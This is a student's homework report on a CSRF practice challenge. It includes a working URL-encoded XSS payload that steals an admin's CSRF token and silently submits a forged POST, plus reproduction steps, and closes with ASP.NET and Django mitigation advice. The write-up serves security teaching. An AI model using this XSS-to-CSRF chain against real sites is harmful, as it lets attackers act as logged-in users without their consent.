Royce Le
INFO 415
HW4 - CSRF Homework

--------- Vulnerabilities ---------
They are attached in the folder and named excpted for payload 4 which is a url:
Level 1: hw4_csrf_payload1
Level 2: hw4_csrf_payload2
Level 3: hw4_csrf_payload3
Level 4: There is a .txt document with the name hw4_csrf_payload4 w/ the link inside or you can view the link directly here where I provided the link below. 
http://csrf-challenges.r7.io/xss?cc=%3Cbody%3E%3C/body%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%22http://csrf-challenges.r7.io/make_post/4%22,%20false);xhr.send();parser%20=%20new%20DOMParser();var%20doc%20=%20parser.parseFromString(xhr.responseText,%20%22text/html%22);var%20token%20=%20doc.getElementsByName(%22csrf%22)[0].value;var%20frame%20=%20document.createElement(%22iframe%22);frame.setAttribute(%22name%22,%20%22hiddenFrame%22);frame.setAttribute(%22style%22,%20%22display:none%22);document.body.appendChild(frame);var%20form%20=%20document.createElement(%22form%22);form.setAttribute(%22name%22,%20%22post_form%22);form.setAttribute(%22action%22,%20%22http://csrf-challenges.r7.io/make_post/4%22);form.setAttribute(%22method%22,%20%22POST%22);form.setAttribute(%22target%22,%20%22hiddenFrame%22);var%20hiddenField%20=%20document.createElement(%22input%22);hiddenField.setAttribute(%22type%22,%20%22hidden%22);hiddenField.setAttribute(%22name%22,%20%22csrf%22);hiddenField.setAttribute(%22value%22,%20token);var%20textareaa%20=%20document.createElement(%22input%22);textareaa.setAttribute(%22name%22,%20%22post%22);textareaa.setAttribute(%22value%22,%20%22royle%22);textareaa.setAttribute(%22style%22,%20%22display:none%22);form.appendChild(hiddenField);form.appendChild(textareaa);document.body.appendChild(form);post_form.submit();%3C/script%3E


--------- The Report ---------
*What is CSRF and why is it bad
	Cross-Site Request Forgery (CSRF) is an attack that forces an end user to commit to an action  that they didn't intent to while they're on an authenticated web application through abusing the trust relationship between browser and server. CSRFs can make users perform state changing requests such as changing their email address, transferring funsds, commenting something they didn't intend to, etc... CSRFs are bad because they may cause leakage of private data, the loss of data or monetary funds, and more that will impact a company or an individual. 

*Test Steps. 1 sets of test steps, for the top one you solved, that includes how you found the vulnerability and how it works. This should be detailed enough that someone in the class who didn't solve the challenges could walk through the steps, be able to reproduce the vulnerabilities, know how they worked, and why they happened.
	1) Go to http://csrf-challenges.r7.io/make_post/4 on Morzilla Fox & open up the Burp Suite.
	2) Inspect the page source by right clicking on the white space on the page and clicking on the "View page source" option.
	3) From here, you should see that there is a <div> tag that contains the form information seen on the link in step 1. You should see that the value for the <input> tag with the name attribute "csrf" is filled, that is your csrf token. So if you type in "hi" into the form field on the first link, and press submit, you should see on Burp that your csrf token and your value in the input form field is being passed as a POST request. If you forward the request on Burp, the page will now say "not authorized, you must be an admin to make a post".  So if we can get the admin token to be passed into the "csrf" paramater in our post request we may be able to have a successful POST request!
	4) From there, we know that we have to somehow get the csrf token of the admin, so it'd be helpful if there was a way to inject javascript onto the domain of csrf-challenges.r7.io. Luckily, if you look on the top navigation bar of the link in step 1, you can see that there is the "XSS Vuln", which looks like a page we can insert scripts into. So click on the linked "XSS Vuln" at the top, which will take you to http://csrf-challenges.r7.io/xss?cc=EN
	5) From there, we want to test to see if scripts will work on this page. If you insert <script>alert(0)</script> into the url in replacement of "EN" (http://csrf-challenges.r7.io/xss?cc=%3Cscript%3Ealert(0)%3C/script%3E) , and submit that URL into the browser, you should see a pop-up box that says "0". Sure enough, you do, thus, with a javascript XSS attack, we may be able to grab the csrf token from the admin (if they click on our link) through a GET request, and use that csrf token with a POST request to make a post on the link in the first step. 


*Mitigations. Give mitigation recommendations for 2 languages/frameworks
*ASP.NET
	To prevent CSRF attacks, ASP.NET has the capabilitity to generate anti-forgery (also called anti-csrf and request verification) securtity tokens. How the anti-forgery tokens work:
	1) The client will request an HTML page that contains a form
	2) The server will include two tokens in the response, the first being a token sent as a cookie and the other is in a hidden form field. Both tokens are generated randomly so that attackers may not guess the values.
	3) When the client submits the form, both tokens must be sent back to the server. The client will send the cookie token as a cookie and that has the form token inside the form data.
	4) If a request does not have both tokens, the server will deny and ignore the request. Here is an example of an HTML form w/ a hidden token:
		<form action="/Home/Test" method="post">
	    <input name="__RequestVerificationToken" type="hidden"   
	           value="6fGBtLZmVBZ59oUad1Fr33BuPxANKY9q3Srr5y[...]" />    
	    <input type="submit" value="Submit" />
		</form>
		For more in-depth information and understanding, please refer to:
		https://docs.microsoft.com/en-us/aspnet/web-api/overview/security/preventing-cross-site-request-forgery-csrf-attacks
		or
		https://www.owasp.org/index.php/Anti_CSRF_Tokens_ASP.NET

*Django
	To prevent CSRF attacks, Django has a CSRF middleware and template tag that provides "easy-to-use" protection against CSRFs. To protect the webpage from a CSRF, the CSRF middleware is avtivated by default in the MIDDLEWARE setting. The developers should add ‘django.middleware.csrf.CsrfViewMiddleware’ to MIDDLEWARE_CLASSES in their configuration before any other middleware that assumes that CSRF attacks have been dealt with. In any template that uses a POST form, the developer may use the csrf_token tag inside the <form> element (i.e. <form action="" method="post">{% csrf_token %}) for internal URL uses (not for external URLs since the CSRF token could be leaked leading to another vulnerability). In corresponding view functions, the developer has to ensure that RequestContext is used to render the response so that {% csrf_token %} will work properly. For more in-depth ifnormation and understanding please refer to the following link:
	https://docs.djangoproject.com/en/1.8/ref/csrf/#using-csrf


--------- My resources ---------
*How I was able to answer the question posted for the hw
	*https://www.owasp.org/index.php/Anti_CSRF_Tokens_ASP.NET
	*https://www.owasp.org/index.php/Anti_CSRF_Tokens_ASP.NET
	*https://docs.djangoproject.com/en/1.8/ref/csrf/#using-csrf

*Furthermore, I was able to figure out how to implement part of number 4 thanks to Evan C. for giving me hints on how to create and append elemnts to make a form for POST requests.

*Lost track of what link helped me with what problem cause there were too many, but here are a list of all the links I utilized
	*https://rileykidd.com/2013/09/09/using-xss-to-csrf/
	*https://www.troyhunt.com/owasp-top-10-for-net-developers-part-5/
	*https://www.troyhunt.com/understanding-csrf-video-tutorial/
	*http://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest
	*http://stackoverflow.com/questions/692196/post-request-javascript
	*http://stackoverflow.com/questions/133925/javascript-post-request-like-a-form-submit
	*https://www.kirupa.com/html5/making_http_requests_js.htm
	*https://www.optiv.com/blog/bypassing-csrf-tokens-via-xss
